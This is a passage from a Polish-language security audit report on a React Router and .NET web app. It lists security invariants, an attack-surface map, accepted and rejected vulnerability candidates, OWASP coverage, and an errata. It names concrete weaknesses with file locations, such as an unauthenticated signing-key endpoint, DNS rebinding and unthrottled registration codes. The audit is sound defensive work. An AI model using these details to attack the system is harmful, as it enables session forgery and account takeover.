| `grep` po wzorcach wstrzyknięć (`dangerouslySetInnerHTML`, `FromSqlRaw`, `ExecuteSqlRaw`, `eval`, `new Function`, `JSON.parse`, `Invoke-Expression`, `Math.random`) | Jedyne trafienie: `app/root.tsx:126` (`ZMIENNE_CSS` ze stałych modułowych — bezpieczne, A.5). |

Aplikacji, API ani tunelu nie uruchamiano; `npm run typecheck`/`dotnet test` nie dotyczą (brak zmian w kodzie).

### A.3 Niezmienniki bezpieczeństwa — wynik weryfikacji

| # | Niezmiennik (źródło) | Wynik | Dowód |
|---|---|---|---|
| N1 | Kestrel wyłącznie na pętli zwrotnej (`TreeIdentity.cs:23-39`) | ✅ zachowany; ⚠️ ryzyko resztkowe → F-002 | `src/Api/appsettings.json:5`; `start-api.ps1:171` wymusza URL z linii poleceń; brak `launchSettings.json` |
| N2 | Tunel wyłącznie na port 3000 w trybie produkcyjnym | ✅ zachowany (produkcja); ❌ tryb dev tuneluje 5173 → F-001 | `start-prod-tunnel.ps1:244`; `start-tunnel.ps1:188` |
| N3 | Żadna trasa zasobowa nie przepuszcza nagłówków przeglądarki | ✅ zachowany | `app/lib/api.server.ts:176-184` (nagłówki budowane od zera, `X-TreeGrid-User` tylko z `options.userId`); `app/routes/api.health.ts:27-57` (bez przekazywania zapytania ani nagłówków); brak proxy Vite |
| N4 | Każda `action` zmieniająca stan woła `requireSameOrigin` | ✅ zachowany (7/7) | `logowanie.tsx:55`, `rejestracja.tsx:46`, `wylogowanie.ts:28`, `obiekty.tsx:134`, `kategorie.tsx:110`, `drzewo.tsx:255`, `ekrany.tsx:353`; `api.health.ts:68` zwraca tylko 405 |
| N5 | Porównanie originów wyłącznie po nazwie hosta (`lessons.md`) | ✅ zachowany | `app/lib/auth.server.ts:166-183`; brak `Origin` → odmowa (`:173`) |
| N6 | Brama jako `middleware` + pusty `loader` | ✅ zachowany | `app/routes/chronione.tsx:31-45`; wszystkie widoki produktu w `layout("routes/chronione.tsx")` (`app/routes.ts:56-86`); trasy publiczne: `logowanie`, `rejestracja`, `wylogowanie`, `api/health`, `wzornik` (tylko `NODE_ENV=development`, `routes.ts:50-52`) |
| N7 | Wildcard `*.trycloudflare.com` tylko razem z `requireSameOrigin` | ✅ zachowany | `react-router.config.ts:28` + N4; `trycloudflare.com` na Public Suffix List (sprawdzone przez subagenta d) |
| N8 | Sekrety poza repozytorium, nieobecne w logach i `context` | ✅ zachowany | `appsettings.json:18-21` puste; `Program.cs:89-93` loguje tylko nazwy kluczy; `session.server.ts:171-196` bez klucza w `context` |
| N9 | Produkcja odmawia startu bez sekretów i z oczekującymi migracjami | ✅ zachowany | `Program.cs:83-97`, `:105-128` |
| N10 | `HOST=127.0.0.1`, jawny `PORT`, `NODE_ENV=production` przy wystawieniu | ✅ zachowany | `start-prod-tunnel.ps1:190-212` |
| N11 | Minimalna długość klucza podpisu | ✅ zachowany (klucz); ❌ brak odpowiednika dla kodu rejestracyjnego → F-003 | `AuthSecrets.cs:40`, `:77-80`; `:68-71` |
| N12 | `X-TreeGrid-User`: dokładnie jedna wartość, niepusta, istniejące konto | ✅ zachowany | `TreeIdentity.cs:77-90`; jeden komunikat dla wszystkich odmów (`:60`) |
| N13 | Własność drzew i ekranów sprawdzana w API (BOLA) | ✅ zachowany | `TreeEndpoints.cs:575-582` (`FindOwnedTreeAsync`), węzeł w URL należy do drzewa (`:438-441`, `:551-554`), rodzic z tego samego drzewa (`:345-348`, `:448-451`); `ScreenEndpoints.cs:153`, `:371` (drzewo ekranu własne), filtr właściciela na każdym endpoincie ekranu |
| N14 | Reguły drzewa (zapętlenie, duplikat rodzeństwa, limit) egzekwowane przez API w transakcji | ✅ zachowany | `TreeEndpoints.cs:358`, `:365`, `:373`, `:476`, `:485`; iteracyjny DFS bez rekurencji (`TreeRules.cs:149-201`); transakcje przed pierwszym odczytem |
| N15 | Sesja wydawana od zera przy logowaniu (brak session fixation) | ✅ zachowany | `app/lib/auth.server.ts:118-130` |
| N16 | Flagi ciasteczka sesji | ✅ zachowany | `session.server.ts:122-133` (`httpOnly`, `secure`, `sameSite: "lax"`, bez `domain`) |

### A.4 Mapa powierzchni ataku (Faza 1)

**Trasy React Routera (`app/routes.ts`):**

| Trasa | Dostęp | `loader` | `action` |
|---|---|---|---|
| `/logowanie` | publiczna | tak | tak (logowanie) |
| `/rejestracja` | publiczna | tak | tak (rejestracja) |
| `/wylogowanie` | publiczna | 405 | tak (POST) |
| `/api/health` | publiczna, zasobowa | tak (proxy `/health`) | 405 |
| `/wzornik` | publiczna, tylko `NODE_ENV=development` | tak | — |
| `/` (`home`) | za bramą | — | — |
| `/obiekty` | za bramą | tak | tak (dodaj/zapisz/usuń) |
| `/kategorie` | za bramą | tak | tak |
| `/drzewo` | za bramą | tak | tak (drzewa i węzły) |
| `/ekrany` | za bramą | tak | tak (ekrany, kategorie węzłów) |

**Endpointy API (`src/Api/**/*Endpoints.cs`, `Program.cs`):**
- Bez tożsamości: `GET /health`; `POST /auth/register`, `POST /auth/login`; `GET /internal/session-signing-key`; `GET|POST /objects`, `PUT|DELETE /objects/{id}`; `GET|POST /categories`, `PUT|DELETE /categories/{id}`; `GET /openapi/*` (tylko Development).
- Z tożsamością `X-TreeGrid-User` (`TreeIdentity`): `/trees` i `/trees/{treeId}/nodes/*`; `/screens` i `/screens/{id}/*`.

**Przejrzane pliki per obszar:**
- (a) Uwierzytelnianie i sesja: `app/lib/auth.server.ts`, `session.server.ts`, `api.server.ts`, `app/routes/chronione.tsx`, `logowanie.tsx`, `rejestracja.tsx`, `wylogowanie.ts`, `api.health.ts`, `app/routes.ts`, `src/Api/Program.cs`, `Auth/AuthEndpoints.cs`, `Auth/AuthSecrets.cs`, `Tree/TreeIdentity.cs`, `Errors/ApiErrorHandling.cs`, `Errors/ApiError.cs`, `app/root.tsx`, `app/theme/zmienne.ts`, `app/theme/ciasteczko.ts`.
- (b) Słowniki: `src/Api/Objects/*`, `src/Api/Categories/*`, `src/Api/Data/{Category,DictionaryCode,AppDbContext}.cs` i encja obiektu, `app/lib/objects.server.ts`, `categories.server.ts`, `app/routes/obiekty.tsx`, `kategorie.tsx`, `app/components/{FormularzObiektu,FormularzKategorii,TabelaSlownika,KategorieWezla}.tsx`.
- (c) Drzewa i ekrany: `src/Api/Tree/*`, `src/Api/Screens/*`, `src/Api/Data/{Screen,TreeNode}.cs`, `app/lib/{tree.server,screens.server,drzewo,ekran}.ts`, `app/routes/{drzewo,ekrany}.tsx`, `app/components/{DrzewoStruktury,GridEkranu,FormularzDrzewa,PasekBudowy,ListaObiektowZrodlowych}.tsx`.
- (d) Konfiguracja i skrypty: `vite.config.ts`, `react-router.config.ts`, `package.json`, `package-lock.json`, `global.json`, `.config/dotnet-tools.json`, `src/Api/Api.csproj`, `src/Api/appsettings*.json`, `.gitignore`, `.dockerignore`, `Dockerfile`, `buduj_app_dev.ps1`, `.claude/skills/run-tunel-app/{SKILL.md,scripts/*.ps1}`, `app/entry.server.tsx`.

### A.5 Kandydaci — mapowanie na znaleziska i odrzucenia

| Kandydat | Obszar | Wynik | Uzasadnienie |
|---|---|---|---|
| K-01 Serwowanie plików projektu przez tunel dev | d | → **F-001** | Potwierdzone w źródłach Vite 8.3.0; wymaga testu dynamicznego. |
| K-02 `AllowedHosts: "*"` + DNS rebinding na API | b | → **F-002** | Potwierdzone w `appsettings.json:28` i `AuthEndpoints.cs:33`; podniesione do High przez ekspozycję klucza podpisu (w raporcie subagenta: Medium, bez uwzględnienia `/internal`). |
| K-03 Zgadywanie kodu rejestracyjnego | a, d | → **F-003** | Brak limitera w całym API; brak progu długości. |
| K-04 Logowanie bez limitu tempa, enumeracja przez 423, DoS blokadą | a | → **F-004** | — |
| K-05 Sesja bez wygaśnięcia i unieważnienia | a, d | → **F-005** | — |
| K-06 Materializacja węzły × kategorie bez limitu | c | → **F-006** | Potwierdzone w `ScreenRules.cs:139-161`, `:187-198`. |
| K-07 Brak limitów na konto (drzewa, ekrany, słowniki) | b, c | → scalone z **F-006** | Ten sam mechanizm (API4), jedna rekomendacja. |
| K-08 Brak logów zdarzeń bezpieczeństwa | a, d | → **F-007** | — |
| K-09 Brak audytu zmian wspólnych słowników | b | → scalone z **F-007** | Ta sama klasa (A09). |
| K-10 Brak nagłówków bezpieczeństwa | d | → **F-008** | Subagent proponował Low–Medium; przyjęto Medium (zasada skilla: wyższy poziom przy wątpliwości). |
| K-11 `reason` z `fetch` w `context` (widoki) | b, c | → **F-009** | — |
| K-12 `reason` w publicznym `/api/health` | d | → scalone z **F-009** | Ta sama przyczyna. |
| K-13 Homoglify w kodach słownika | b | → **F-010** | — |
| K-14 Własność ekran→drzewo tylko w kodzie + mylący komentarz | c | → **F-011** | — |
| K-15 Dockerfile, NuGet lock, `--no-autoupdate`, tunel na `localhost`, Google Fonts | d | → **F-012** | Tunel na `localhost` przy nasłuchu `127.0.0.1`: kontrola zajętości portu obejmuje IPv4 i IPv6 — ryzyko pomijalne. |
| K-16 Brak MFA / HIBP, parametry PBKDF2, wyciek długości w `FixedTimeEquals` | a | → **F-013** | — |
| K-17 Usunięcie kategorii zmienia cudze ekrany (kaskada) | b | ❌ odrzucony | Świadoma decyzja planu `zapisane-ekrany` (plan.md:5: „usunięcie kategorii zdejmuje ją z ekranów kaskadą”) w płaskim modelu PRD; nie jest dostępem do cudzego ekranu. Rozjazd dokumentacji (PRD Open Question 4) → sekcja 8. |
| K-18 409 `object_in_tree` / `category_sole_screen_default` ujawnia istnienie cudzych danych | b | ❌ odrzucony | Jednobitowa informacja, `context` celowo pusty, udokumentowana i zaakceptowana w kodzie (`CategoryEndpoints.cs:179-181`). |
| K-19 Wspólne słowniki bez filtra właściciela (BOLA?) | b | ❌ odrzucony | Zgodne z PRD (`prd.md:118-120`, FR-002): słowniki są wspólne z założenia. |
| K-20 Zaufanie do `X-TreeGrid-User` | a, c | ❌ odrzucony jako luka | Przyjęta decyzja; warunki zachowane (N1–N3, N12); ryzyko resztkowe opisane w F-002. |
| K-21 Nieuwierzytelniony `/internal/session-signing-key` | a | ❌ odrzucony jako luka | Przyjęta decyzja; warunki zachowane; ryzyko resztkowe → F-002. |
| K-22 Wildcard `allowedActionOrigins` | a | ❌ odrzucony | Bezpieczny razem z N4 i N5 — oba zachowane. |
| K-23 `dangerouslySetInnerHTML` w `root.tsx:126` | a | ❌ odrzucony | `ZMIENNE_CSS` powstaje wyłącznie ze stałych modułowych (`app/theme/zmienne.ts:17-33`); brak wejścia z żądania. |
| K-24 Ciasteczko motywu `tg-motyw` bez `HttpOnly` | a, d | ❌ odrzucony | Wartość niewrażliwa, parsowana przez zamkniętą listę (`jestWariantem`), odczyt nie rzuca. |
| K-25 Pole koloru kategorii jako wektor wstrzyknięcia CSS | b | ❌ odrzucony | Serwer przyjmuje wyłącznie `#` + 6 cyfr szesnastkowych (`CategoryRules.cs:77-81`), kolumna 7 znaków, render jako obiekt stylu React. |
| K-26 Open redirect w akcjach | a, b, c | ❌ odrzucony | Cele przekierowań to stałe albo adresy z identyfikatorem liczbowym. |
| K-27 Identyfikatory z `DataTransfer` przy przeciąganiu | c | ❌ odrzucony | Wymaga gestu użytkownika, wartość musi być dodatnią liczbą całkowitą, skutek ograniczony do własnego drzewa. |
| K-28 `GET /screens/{id}` bez transakcji | c | ❌ odrzucony | Tylko odczyt; spójność opisana w kodzie, brak skutku bezpieczeństwa. |
| K-29 Treść wyjątków w odpowiedziach API | a | ❌ odrzucony (Production) | Tylko w Development (`ApiErrorHandling.cs:25`, `:44-46`); w trybie dev tunelu → część F-001. |
| K-30 Session fixation | a | ❌ odrzucony | Sesja tworzona od zera (N15). |
| K-31 SQL injection | b, c | ❌ odrzucony | Wyłącznie LINQ EF Core; jedyne `CommandText` to stałe `PRAGMA` (`Program.cs:233`, `:250`, `:264`). |

### A.6 Pokrycie kategorii OWASP

| Kategoria | Wynik |
|---|---|
| A01:2025 Broken Access Control | F-001 (ominięcie bramy w trybie dev), F-002, F-011; własność drzew i ekranów poprawna (N13) |
| A02:2025 Security Misconfiguration | F-001, F-002, F-008, F-009, F-012 |
| A03:2025 Software Supply Chain Failures | F-012; skan npm/NuGet: 0 podatności, lockfile z `integrity` (A.2) |
| A04:2025 Cryptographic Failures | F-002 (ujawnienie klucza podpisu); poza tym brak kandydatów — porównanie kodu w stałym czasie, klucz ≥ 32 znaki, hashowanie haseł przez Identity (F-013: tylko rekomendacja parametrów), brak własnej kryptografii |
| A05:2025 Injection | Brak kandydatów — wyłącznie LINQ EF Core, React escapuje tekst, jedyne `dangerouslySetInnerHTML` ze stałych (K-23, K-25, K-31) |
| A06:2025 Insecure Design | F-006, F-010 |
| A07:2025 Authentication Failures | F-003, F-004, F-005, F-013 |
| A08:2025 Software or Data Integrity Failures | Brak kandydatów — brak deserializacji niezaufanych typów (tylko `System.Text.Json` do rekordów DTO), brak webhooków, auto-update i ładowania wtyczek; sesja podpisana (integralność zależy od klucza — F-002) |
| A09:2025 Logging & Alerting Failures | F-007 |
| A10:2025 Mishandling of Exceptional Conditions | F-009; ścieżki odczytu sesji fail-closed (`auth.server.ts:62-73`), wyjątki bez treści poza Development (K-29) |
| API1:2023 BOLA | Brak kandydatów poza F-011 (obrona w głąb) — N13 |
| API2:2023 Broken Authentication | F-004, F-005 |
| API3:2023 Broken Object Property Level Authorization | Brak kandydatów — rekordy żądań z allowlistą pól, `UserId` i `Id` ustawiane po stronie serwera, odpowiedzi kont bez hasha (`AuthEndpoints.cs:212-213`); K-18 odrzucony |
| API4:2023 Unrestricted Resource Consumption | F-003, F-004, F-006 |
| API5:2023 Broken Function Level Authorization | Brak kandydatów — model płaski bez ról (`prd.md:118-120`); jedyne endpointy „administracyjne” to `/internal/*` (F-002) i `/openapi` (tylko Development) |
| API6:2023 Unrestricted Access to Sensitive Business Flows | F-003 (masowe próby rejestracji) |
| API7:2023 SSRF | Brak kandydatów — jedyne wywołania wychodzące to `fetch` do stałego `API_BASE_URL` (`api.server.ts:18`); brak URL-i od użytkownika |
| API8:2023 Security Misconfiguration | F-001, F-002, F-008 |
| API9:2023 Improper Inventory Management | Brak kandydatów — jedna wersja API, OpenAPI tylko w Development (`Program.cs:138-141`), rejestr tras jawny (`app/routes.ts`); wzornik tylko przy `NODE_ENV=development` |
| API10:2023 Unsafe Consumption of APIs | Brak kandydatów — jedynym konsumowanym API jest własne API na pętli zwrotnej; odpowiedzi walidowane strażnikami typów (`isApiErrorBody`, `isSessionUser`) |

---

## Dodatek B. Errata

Dopisane przy wdrożeniu poprawek (zmiana `owasp-f002-f003`). Treść sekcji 1-9
i dodatku A zostaje nietknięta — raport jest datowanym artefaktem audytu,
a nie brudnopisem; poprawka in-place zatarłaby fakt, że analiza statyczna
w tym punkcie się pomyliła.

**Erratum 1 — 400 z filtra `Host` nie wychodzi w kopercie błędów.**
Dotyczy sekcji 5 (`raport.md:446`) i checklisty (`:907`). Raport zakłada, że
odpowiedź `HostFilteringMiddleware` przejdzie przez `UseStatusCodePages`
i zostanie w kontrakcie jako `http_error`. Tak nie jest: filtr nie jest
rejestrowany w `Program.cs` — wstawia go `HostFilteringStartupFilter`
z domyślnych ustawień web-hosta, a `IStartupFilter` owija cały potok aplikacji,
więc filtr biegnie **przed** `app.UseApiErrorContract()`. Odrzucone żądanie
zwiera potok i nigdy nie dociera do kontraktu błędów. Przeniesienie
`UseHostFiltering()` niżej tego nie zmienia — instancja ze startup filtra i tak
odrzuca pierwsza, a `HostFilteringOptions` jest jedna na obie.

Domyślne zachowanie jest przy tym gorsze, niż raport zakłada: przy
`IncludeFailureMessage = true` middleware pisze stronę `text/html` z tekstem
`Bad Request - Invalid Hostname`, czyli odpowiedź w cudzym formacie
(zweryfikowane w `Microsoft.AspNetCore.HostFiltering.dll` z shared framework
10.0.6). Wdrożenie ustawia więc `IncludeFailureMessage = false` i podnosi log
kategorii `Microsoft.AspNetCore.HostFiltering` do `Information` — inaczej próba
DNS rebindingu nie zostawiałaby żadnego śladu, bo `Microsoft.AspNetCore` jest
ścięte do `Warning`. Oczekiwany wynik testu: **400 bez treści**, ślad
w logu API. Wyjątek od kontraktu błędów jest nazwany w `CLAUDE.md`.

**Erratum 2 — 429 z limitera wychodzi w kopercie i nie wymaga zmian w widoku.**
Uzupełnienie sekcji 5. `UseStatusCodePages` uzupełnia wyłącznie odpowiedzi
400-599 **bez treści**, a `OnRejected` pisze JSON i ustawia `Content-Type`,
więc koperta `rate_limited` przechodzi nietknięta mimo że limiter stoi za
kontraktem błędów. Po stronie widoku nie trzeba nic dokładać: `requestAccount`
(`app/lib/auth.server.ts`) przepuszcza kopertę API w oryginale, a
`komunikatOgolny` w `logowanie.tsx` i `rejestracja.tsx` przy pustym
`context.fields` renderuje `error.message` w banerze `Alert`.
